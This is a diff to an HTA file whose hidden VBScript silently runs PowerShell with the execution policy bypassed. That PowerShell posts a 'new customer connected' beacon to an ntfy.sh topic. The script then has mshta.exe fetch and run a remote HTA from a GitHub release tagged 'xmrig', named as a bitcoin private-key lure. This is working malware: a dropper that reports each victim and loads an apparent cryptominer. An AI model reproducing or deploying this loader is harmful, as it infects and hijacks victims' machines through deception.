@@ -3,8 +3,13 @@
   <HTA:APPLICATION ID="trigger" WINDOWSTATE="minimize">
   <script language="VBScript">
     On Error Resume Next
-    CreateObject("WScript.Shell").Run "powershell -WindowStyle Hidden -Command ""Invoke-RestMethod -Uri 'https://ntfy.sh/dillertus77' -Method Post -Body 'New customer via GitHub Pages'""", 0, True
+
+    ' NTFY Nachricht per PowerShell
+    CreateObject("WScript.Shell").Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Invoke-RestMethod -Uri 'https://ntfy.sh/dillertus77' -Method Post -Body 'New Customer Connected via LNK GitHubPages'""", 0, True
+
+    ' Danach deine eigentliche HTA starten
     CreateObject("WScript.Shell").Run "mshta.exe https://github.com/bertammedia/spacetut747/releases/download/xmrig/Bitcoin_Wallet_Privatekey_Balance_2.794_BTC.hta", 0, False
+
     self.close
   </script>
 </head>
